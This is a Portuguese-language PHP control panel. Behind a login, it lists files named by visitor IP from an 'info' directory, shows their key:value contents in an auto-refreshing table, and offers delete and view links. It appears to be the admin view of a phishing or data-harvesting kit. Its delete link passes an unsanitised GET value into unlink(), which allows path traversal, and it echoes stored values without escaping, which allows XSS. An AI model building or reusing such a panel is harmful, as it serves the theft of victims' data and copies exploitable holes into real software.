<?php 
include './config.php';
$path = "info";

if(!isset($_SESSION['logged']) || $_SESSION['logged'] != true){
    header("Location: index.php");
    exit;
}

if(!empty($_GET['delete'])){
    $deleteIp = $_GET['delete'];

    if(unlink("{$path}/{$deleteIp}")){
        echo '<script>alert("Info deletada com sucesso!");window.location.href="controle.php";</script>';
    }else{
        echo '<script>alert("Falha ao deletar info!");window.location.href="controle.php";</script>';
    }
}


$diretorio = dir($path);

$ListaInfos = [];
$contaInfos = 0;
    
while($arquivo = $diretorio -> read()){
    if($arquivo == '.' || $arquivo == '..' || $arquivo == 'index.html'){}else{
        $dados = file_get_contents("{$path}/{$arquivo}");
        $dados = explode("\n", $dados);
        $ListaInfos[$contaInfos] = $dados;
		$ListaInfos[$contaInfos]['ip'] = $arquivo;
        $contaInfos++;
    }
    
}
$diretorio -> close();
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acesso</title>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        body{background-color: #f1f1f1;box-sizing: border-box;}
        *{font-family: 'Open Sans', sans-serif;}
        .container{display:block;float:left;width:100%;}
        .content{display:block;width:95%;margin:20px auto;}
        .content .menu{display:block;background-color: #444;height: 60px;margin-bottom: 20px;padding: 0 10px;}
        .content .menu h1{color: #0099ff;width: 70%;float:left;display:block;margin:0;padding:0;line-height: 60px;}
        .content .menu span{display:block;float:right;width: 30%;}
        .content .menu span a{height: 50px;line-height: 50px;font-size: 1.3em;color: #fff;font-weight: 600;background-color: #0099ff;width: 150px;float: right;margin-top: 5px;text-decoration: none;text-align: center;}
        .content .menu span a:hover{text-decoration: underline;}
    </style>
    <meta http-equiv="refresh" content=<?php echo TEMPO_ATUALIZA;?>;url="controle.php">
</head>
<body style="background-color:#222;">
    
<div class="container">
    <div class="content">
        
        <div class="menu">
            <h1>Lista de infos cadastradas. { <?php echo $contaInfos;?> }</h1>
            <span><a href="logoff.php">Sair</a></span>
        </div>

        <table border="0" cellpadding="15" cellspacing="1" style="display:block;width:100%;">
        <?php 
		
            for($i = 0;$i < count($ListaInfos);$i++){
                
                $getIpInfo = '';
                echo '<tr style="background-color:#fefefe;" border="0">';
                for($j = 0;$j < count($ListaInfos[$i]) - 2;$j++){
					
					$getIpInfo = $ListaInfos[$i]['ip'];
                    echo '<td style="min-width: 130px;">';
                    $sepInfo = explode(":", $ListaInfos[$i][$j], 2);
                    
                    echo '<strong style="color:#09f;">' . strtoupper($sepInfo[0]) . '</strong>:<br> <strong style="color:#222;">' . $sepInfo[1] . '</strong>';
                    echo '</td>';
                }
                echo '<td><a href="?delete='. $getIpInfo .'" style="background-color:#ff0000;color:#fff;padding:10px 15px;text-decoration:none;">Deletar</a></td>';
                echo '<td><a href="./info/'. $getIpInfo .'" target="_blank" style="background-color:#ff0000;color:#fff;padding:10px 15px;text-decoration:none;">Ver</a></td>';
                echo '</tr>';
                echo '<tr><td></td></tr>';
            }
        ?>
        </table>
    <div class="clear"></div>
    </div><!-- content -->
</div><!-- container -->

</body>
</html>